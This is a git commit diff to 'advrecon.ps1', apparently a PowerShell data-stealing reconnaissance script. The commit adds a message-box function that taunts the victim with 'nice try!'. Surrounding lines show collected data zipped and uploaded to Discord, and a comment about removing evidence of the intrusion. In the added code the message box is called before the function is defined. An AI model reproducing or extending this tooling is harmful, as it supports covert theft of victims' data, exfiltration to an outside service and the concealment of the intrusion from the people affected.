573c143be5eeed46002d31f41fbfc163e33c181b
nate <69339422+nanitt@users.noreply.github.com>
2023-01-14 15:16:17 -0500

    Update advrecon.ps1

--- advrecon.ps1
+++ advrecon.ps1
@@ -559,6 +559,41 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 ############################################################################################################################################################
 
+MsgBox -m 'nice try!' -t "move in silence" -b OKCancel -i Warning
+
+function MsgBox {
+
+[CmdletBinding()]
+param (	
+[Parameter (Mandatory = $True)]
+[Alias("m")]
+[string]$message,
+
+[Parameter (Mandatory = $False)]
+[Alias("t")]
+[string]$title,
+
+[Parameter (Mandatory = $False)]
+[Alias("b")]
+[ValidateSet('OK','OKCancel','YesNoCancel','YesNo')]
+[string]$button,
+
+[Parameter (Mandatory = $False)]
+[Alias("i")]
+[ValidateSet('None','Hand','Question','Warning','Asterisk')]
+[string]$image
+)
+
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+
+if (!$title) {$title = " "}
+if (!$button) {$button = "OK"}
+if (!$image) {$image = "None"}
+
+[System.Windows.MessageBox]::Show($message,$title,$button,$image)
+
+}
+############################################################################################################################################################
 <#
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
